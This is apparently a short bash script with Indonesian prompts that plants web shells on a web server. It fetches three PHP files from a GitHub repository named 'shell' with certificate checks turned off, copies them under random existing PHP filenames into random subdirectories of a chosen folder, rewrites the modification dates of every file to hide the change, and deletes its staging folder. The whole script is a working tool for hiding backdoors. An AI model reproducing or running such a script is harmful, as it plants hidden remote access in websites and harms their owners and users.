#!/bin/bash

echo "Daftar directory yang tersedia:"
ls -d */

echo "Silahkan masukkan nama folder tujuan:"
read varname
echo "Directory yang di tuju: $varname"

mkdir x

wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/hd.php

for i in $(ls -l x/ | awk '{print $9}' | sed '/^$/d'); do
    myfile=$(find "$varname" -name "*.php" | rev | cut -d/ -f 1 | rev | shuf -n 1)
    mydir=$(find "$varname" -type d | shuf -n 1)

    if [ ! -f "$mydir/$myfile" ]; then
        cp "x/$i" "$mydir/$myfile"
        echo "$mydir/$myfile"
    else
        xmyfile=$(find "$varname" -name "*.php" | rev | cut -d/ -f 1 | rev | shuf -n 1)
        xmydir=$(find "$varname" -type d | shuf -n 1)

        if [ ! -f "$xmydir/$xmyfile" ]; then
            cp "x/$i" "$xmydir/$xmyfile"
            echo "$xmydir/$xmyfile"
            find . -exec touch -m -d '01/01/1337' {} +
        fi
    fi
done

rm -rf x

echo "Selesai."
